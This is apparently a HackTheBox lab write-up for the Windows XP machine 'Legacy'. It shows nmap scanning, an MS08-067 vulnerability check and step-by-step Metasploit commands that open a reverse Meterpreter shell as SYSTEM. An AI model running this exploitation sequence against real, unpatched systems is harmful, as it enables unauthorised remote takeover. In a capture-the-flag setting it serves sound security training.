# Legacy

**Platform:** HackTheBox  
**OS:** Windows XP  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows XP machine vulnerable to MS08-067 (CVE-2008-4250), a critical 
SMB vulnerability allowing remote code execution. Also vulnerable to 
MS17-010 (CVE-2017-0143). Exploitation via Metasploit grants direct 
SYSTEM access.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.4
```

**Open ports:**

| Port | Service |
|------|---------|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |

---

## 2. Vulnerability Detection

Confirmed MS08-067 vulnerability using nmap script:

```bash
nmap --script smb-vuln-ms08-067 -p 445 10.10.10.4
```

Result: Host is vulnerable to MS08-067.

Also vulnerable to MS17-010 (CVE-2017-0143).

---

## 3. Exploitation

Exploited MS08-067 using Metasploit:

```bash
msfconsole
search CVE-2008-4250
use 0
set RHOST 10.10.10.4
set LHOST tun0
run
```

Received Meterpreter session as **NT AUTHORITY\SYSTEM**.

Dropped into shell:

```bash
shell
```

---

## 4. Flags

Navigated to user flag:
cd "Documents and Settings"
cd john
cd Desktop
type user.txt

Navigated to root flag:
cd ..
cd ..
cd Administrator
cd Desktop
type root.txt

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| nmap scripts | Vulnerability detection |
| Metasploit | MS08-067 exploitation |

---

## Vulnerabilities Found

| Vulnerability | CVE | Description |
|--------------|-----|-------------|
| MS08-067 | CVE-2008-4250 | SMB remote code execution |
| EternalBlue | CVE-2017-0143 | SMBv1 remote code execution |
